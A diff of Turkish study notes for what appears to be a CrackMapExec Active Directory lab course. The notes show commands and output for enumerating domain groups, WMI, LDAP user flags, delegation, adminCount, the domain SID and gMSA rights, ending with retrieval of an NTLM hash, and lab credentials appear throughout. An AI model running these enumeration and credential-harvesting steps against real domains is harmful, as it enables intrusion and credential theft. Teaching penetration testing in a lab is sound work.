 ### Enumerating Domain Groups
-![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
-![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
 
-Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+```
+crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --groups
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 [+] Enumerated domain
+group(s)
+SMB 10.129.203.121 445 DC01 LAPS_PCAdmin
+membercount: 1
+SMB 10.129.203.121 445 DC01 LAPS_DCAdmin
+membercount: 0
+SMB 10.129.203.121 445 DC01
+SQLServer2005SQLBrowserUser$DC01 membercount: 0
+SMB 10.129.203.121 445 DC01 Help Desk 2
+membercount: 0
+SMB 10.129.203.121 445 DC01 Help Desk
+membercount: 0
+SMB 10.129.203.121 445 DC01 Linux Admins
+membercount: 3
+<SNIP>
+SMB 10.129.203.121 445 DC01 Guests
+membercount: 2
+SMB 10.129.203.121 445 DC01 Users
+membercount: 3
+SMB 10.129.203.121 445 DC01 Administrators
+membercount: 5
+
+```
+
+
+Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.
 
 
 ### Group **Members**
-![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
 
-Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+```
+crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --groups
+Administrators
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 [+] Enumerated members
+of domain group
+SMB 10.129.203.121 445 DC01 inlanefreight.htb\htb
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\plaintext
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\Domain Admins
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\Enterprise Admins
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\Administrator
+```
+
+Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
 
 
-### Querying WMI
-[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+### WMI Sorgulama
 
-Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
 
-WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.
 
-Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:
 
 
 ### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
-![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
 
-WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+```
+crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --wmi
+"SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE
+'%sysmon%'"
 
-Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 Caption =>
+Sysmon64.exe
+SMB 10.129.203.121 445 DC01 ProcessId => 3220
+```
+
+WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
 
 
 ### Quering root\WMI Namespace
-![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
-![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
 
-Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+```
+crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --wmi
+"SELECT * FROM MSPower_DeviceEnable" --wmi-namespace "root\WMI"
 
-WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 InstanceName =>
+PCI\VEN_15AD&DEV_0779&SUBSYS_077915AD&REV_00\4&23f707fc&0&00B8_0
+SMB 10.129.203.121 445 DC01 Active => True
+SMB 10.129.203.121 445 DC01 Enable => True
+SMB 10.129.203.121 445 DC01
+SMB 10.129.203.121 445 DC01 InstanceName =>
+PCI\VEN_8086&DEV_10D3&SUBSYS_07D015AD&REV_00\005056FFFFB9E8F200_0
+SMB 10.129.203.121 445 DC01 Active => True
+SMB 10.129.203.121 445 DC01 Enable => True
+SMB 10.129.203.121 445 DC01
+SMB 10.129.203.121 445 DC01 InstanceName =>
+USB\ROOT_HUB30\5&da8887e&0&0_0
+SMB 10.129.203.121 445 DC01 Active => True
+SMB 10.129.203.121 445 DC01 Enable => True
+SMB 10.129.203.121 445 DC01
+SMB 10.129.203.121 445 DC01 InstanceName =>
+USB\VID_0E0F&PID_0003&MI_00\7&2a0405e8&0&0000_0
+SMB 10.129.203.121 445 DC01 Active => True
+SMB 10.129.203.121 445 DC01 Enable => True
+SMB 10.129.203.121 445 DC01
+SMB 10.129.203.121 445 DC01 InstanceName =>
+USB\VID_0E0F&PID_0003&MI_01\7&2a0405e8&0&0001_0
+SMB 10.129.203.121 445 DC01 Active => True
+SMB 10.129.203.121 445 DC01 Enable => True
+```
+
+Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.
+
+
 
 Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
 
+----
+
 
 ### LDAP and RDP Enumeration
-Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır
 
 Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
 
-
 ### LDAP & RDP Commands
+
 LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
-![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
-![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
 
-Henüz çalışmadıklarımızı gözden geçirelim.
+| Komut                                                                          | Açıklama                                                                                           |
+| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |
 
+Henüz çalışmadıklarımız varsa onları gözden geçirelim.
 
 ### Enumerating Users and Groups
 
-SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:
 
 ### Enumerating Users and Groups
 
-![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
-![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
-![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
-![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+```
+crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --
+users --groups
 
-Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
+10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+LDAP dc01.inlanefreight.htb 389 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
+LDAP dc01.inlanefreight.htb 389 DC01 [*] Total of
+records returned 32
+LDAP dc01.inlanefreight.htb 389 DC01 Administrator
+Built-in account for administering the computer/domain
+LDAP dc01.inlanefreight.htb 389 DC01 Guest
+Built-in account for guest access to the computer/domain
+LDAP dc01.inlanefreight.htb 389 DC01 krbtgt
+Key Distribution Center Service Account
+LDAP dc01.inlanefreight.htb 389 DC01 julio
+LDAP dc01.inlanefreight.htb 389 DC01 david
+LDAP dc01.inlanefreight.htb 389 DC01 john
+User for kiosko IP 172.16.10.9
+LDAP dc01.inlanefreight.htb 389 DC01
+svc_workstations
+LDAP dc01.inlanefreight.htb 389 DC01 carlos
+LDAP dc01.inlanefreight.htb 389 DC01 robert
+LDAP dc01.inlanefreight.htb 389 DC01 grace
+LDAP dc01.inlanefreight.htb 389 DC01 peter
+LDAP dc01.inlanefreight.htb 389 DC01 alina
+Account for testing HR App. Password: HRApp123!
+<SNIP>
+LDAP dc01.inlanefreight.htb 389 DC01 Administrators
+LDAP dc01.inlanefreight.htb 389 DC01 Users
+LDAP dc01.inlanefreight.htb 389 DC01 Guests
+LDAP dc01.inlanefreight.htb 389 DC01 Print Operators
+LDAP dc01.inlanefreight.htb 389 DC01 Backup
+Operators
+LDAP dc01.inlanefreight.htb 389 DC01 Replicator
+LDAP dc01.inlanefreight.htb 389 DC01 Remote Desktop
+Users
+LDAP dc01.inlanefreight.htb 389 DC01 Network
+Configuration Operators
+LDAP dc01.inlanefreight.htb 389 DC01 Performance
+Monitor Users
+LDAP dc01.inlanefreight.htb 389 DC01 Performance Log
+Users
+LDAP dc01.inlanefreight.htb 389 DC01 Distributed COM
+Users
+LDAP dc01.inlanefreight.htb 389 DC01 IIS_IUSRS
+LDAP dc01.inlanefreight.htb 389 DC01 Cryptographic
+Operators
+LDAP dc01.inlanefreight.htb 389 DC01 Event Log
+Readers
+LDAP dc01.inlanefreight.htb 389 DC01 Certificate
+Service DCOM Access
+<SNIP>
+
+```
+
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir
 
 
 ### İlginç Hesap Özelliklerini Numaralandırma
 
-ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.
 
-PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
-
-
-### PASSWD_NOTREQD Özniteliğinin Tanımlanması
-
-![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
-![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
-
-TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
-
-### Kısıtlamasız Delegasyonun Belirlenmesi
-![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
-
-adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.
 
 
-### adminCount Özniteliğini Sorgulama
-![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
-![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
-![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+### PASSWD_NOTREQD Attribute Tanımlanması
+
+```
+crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --
+password-not-required
+
+SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
+10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+LDAP dc01.inlanefreight.htb 389 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
+LDAP dc01.inlanefreight.htb 389 DC01 User: Guest
+Status: enabled
+```
+
+`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Unconstrained Delegation Belirlenmesi
+
+```
+crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --
+trusted-for-delegation
+
+SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
+10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+LDAP dc01.inlanefreight.htb 389 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
+LDAP dc01.inlanefreight.htb 389 DC01 MS01$
+LDAP dc01.inlanefreight.htb 389 DC01 DC01$
+```
+
+`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.
+
+
+### adminCount Attribute'u Sorgulama
+
+```
+crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --
+admin-count
+SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
+10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+LDAP dc01.inlanefreight.htb 389 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
+LDAP dc01.inlanefreight.htb 389 DC01 Administrator
+LDAP dc01.inlanefreight.htb 389 DC01 Administrators
+LDAP dc01.inlanefreight.htb 389 DC01 Print Operators
+LDAP dc01.inlanefreight.htb 389 DC01 Backup
+Operators
+LDAP dc01.inlanefreight.htb 389 DC01 Replicator
+LDAP dc01.inlanefreight.htb 389 DC01 krbtgt
+LDAP dc01.inlanefreight.htb 389 DC01 Domain
+Controllers
+LDAP dc01.inlanefreight.htb 389 DC01 Schema Admins
+LDAP dc01.inlanefreight.htb 389 DC01 Enterprise
+Admins
+LDAP dc01.inlanefreight.htb 389 DC01 Domain Admins
+LDAP dc01.inlanefreight.htb 389 DC01 Server
+Operators
+LDAP dc01.inlanefreight.htb 389 DC01 Account
+Operators
+LDAP dc01.inlanefreight.htb 389 DC01 Read-only
+Domain Controllers
+LDAP dc01.inlanefreight.htb 389 DC01 Key Admins
+LDAP dc01.inlanefreight.htb 389 DC01 Enterprise Key
+Admins
+LDAP dc01.inlanefreight.htb 389 DC01 julio
+LDAP dc01.inlanefreight.htb 389 DC01 david
+LDAP dc01.inlanefreight.htb 389 DC01 john
+<SNIP>
+
+```
 
 
 ### Domain SID'sini numaralandırma
 
-Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:
 
+### Domain SID'i Toplama
 
-### Gathering the Domain SID
+```
+crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --
+get-sid
 
-![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
-![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
+10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+LDAP dc01.inlanefreight.htb 389 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
+LDAP dc01.inlanefreight.htb 389 DC01 Domain SID S-1-
+5-21-3325992272-2815718403-617452758
+```
 
 
 ### Group Managed Service Accounts (gMSA)
@@ -3548,138 +4059,342 @@ Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA
 * Basitleştirilmiş service principal name (SPN) yönetimi.
 * Yönetimi diğer yöneticilere devretme yeteneği
 
-Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
 
 Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
 
 Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
 
-
 ### Enumerating Accounts with gMSA Privileges
-![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
-![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
 
-Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+```
+crackmapexec winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X
+"Get-ADServiceAccount -Filter * -Properties
+PrincipalsAllowedToRetrieveManagedPassword"
+
+SMB dc01.inlanefreight.htb 5985 DC01 [*] Windows
+10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
+HTTP dc01.inlanefreight.htb 5985 DC01 [*]
+http://dc01.inlanefreight.htb:5985/wsman
+WINRM dc01.inlanefreight.htb 5985 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
+WINRM dc01.inlanefreight.htb 5985 DC01 [+] Executed
+command
+WINRM dc01.inlanefreight.htb 5985 DC01
+DistinguishedName : CN=svc_inlaneadm,CN=Managed
+Service Accounts,DC=inlanefreight,DC=htb
+Enabled : True
+Name : svc_inlaneadm
+ObjectClass : msDSGroupManagedServiceAccount
+ObjectGUID : 6328a77f-9696-40b4-82b7-
+725ac19564b6
+PrincipalsAllowedToRetrieveManagedPassword :
+{CN=engels,CN=Users,DC=inlanefreight,DC=htb}
+SamAccountName : svc_inlaneadm$
+SID : S-1-5-21-3325992272-
+2815718403-617452758-6123
+UserPrincipalName :
+
+```
+
+
+Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.
 
 
 ### gMSA Parolasını Edinme
-![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+```
+crackmapexec ldap dc01.inlanefreight.htb -u engels -p Inlanefreight1998! --gmsa
+
+SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
+10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+LDAP dc01.inlanefreight.htb 636 DC01 [+]
+inlanefreight.htb\engels:Inlanefreight1998!
+LDAP dc01.inlanefreight.htb 636 DC01 [*] Getting
+GMSA Passwords
+LDAP dc01.inlanefreight.htb 636 DC01 Account:
+svc_inlaneadm$ NTLM: 76fa2df9e8f656ae81b0bd271bef0346
+```
 
 Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
 
-
 ### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
-![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
